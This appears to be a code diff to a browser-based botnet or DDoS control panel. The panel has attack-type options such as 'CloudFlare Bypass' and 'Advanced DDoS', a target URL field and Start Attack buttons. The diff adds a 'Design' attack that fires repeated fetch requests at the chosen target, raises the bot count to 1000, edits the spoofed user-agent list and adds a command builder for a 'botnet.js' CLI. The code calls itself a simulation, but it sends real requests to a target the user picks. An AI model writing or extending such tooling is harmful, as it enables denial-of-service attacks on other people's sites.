@@ -75,6 +75,7 @@
             <option value="CloudFlare Bypass">CloudFlare Bypass</option>
             <option value="Discord Voice Attack">Discord Voice Attack</option>
             <option value="Advanced DDoS">Advanced DDoS</option>
+            <option value="Design">Design</option>
         </select>
         <br>
         <label for="attack-duration">Attack Duration (seconds):</label>
@@ -82,9 +83,10 @@
         <br>
         <button onclick="startAttack()">Start Attack</button>
         <button onclick="stopAttack()">Stop Attack</button>
+        <button onclick="transferToCLI()">Transfer to CLI</button>
     </div>
     <div id="status">
-        <p>Bot Count: 300</p>
+        <p>Bot Count: 1000</p>
         <p>Bot Status: <span id="bot-status"></span></p>
         <p>Attack Status: <span id="attack-status"></span></p>
     </div>
@@ -94,7 +96,7 @@
 
     <script>
         let bots = [];
-        const botCount = 300;
+        const botCount = 1000;
         let botStatus = "Offline";
         let attackStatus = "Idle";
         let attackInterval;
@@ -262,6 +264,17 @@
                         };
                     }, i * 100);
                 }
+            } else if (attackType === 'Design') {
+                // Simulate a design attack
+                console.log(`Starting Design attack on ${targetUrl} with ${botCount} bots.`);
+                alert(`Starting Design attack on ${targetUrl} with ${botCount} bots.`);
+                for (let i = 0; i < botCount; i++) {
+                    setTimeout(() => {
+                        fetch(targetUrl, { headers })
+                            .then(response => console.log(`Request sent to ${targetUrl} with status ${response.status}`))
+                            .catch(error => console.error(`Error sending request to ${targetUrl}: ${error}`));
+                    }, i * 100);
+                }
             } else {
                 console.log(`Sending ${attackType} to ${targetUrl}`);
             }
@@ -271,21 +284,7 @@
         function simulateAttack(targetUrl, attackType, numBots, duration) {
             const endTime = Date.now() + duration * 1000;
             const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
-    'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12H143 Safari/600.1.4',
-    'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F69 Safari/600.1.4',
-    'Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; ATT; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
-    'Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',
     'Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LGMS323 Build/KOT49I.MS32310c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36',
@@ -318,6 +317,22 @@
             updateBotnetStatus();
             alert('Attack stopped.');
             clearInterval(attackInterval);
+        }
+
+        // Function to transfer to CLI
+        function transferToCLI() {
+            const targetUrl = document.getElementById('target-url').value;
+            const attackType = document.getElementById('attack-type').value;
+            const attackDuration = parseInt(document.getElementById('attack-duration').value);
+
+            if (!targetUrl) {
+                alert('Please enter a target URL.');
+                return;
+            }
+
+            const command = `node botnet.js --target ${targetUrl} --type ${attackType} --duration ${attackDuration}`;
+            alert(`Transferring to CLI with command: ${command}`);
+            console.log(`Transferring to CLI with command: ${command}`);
         }
 
         // Simulate botnet initialization
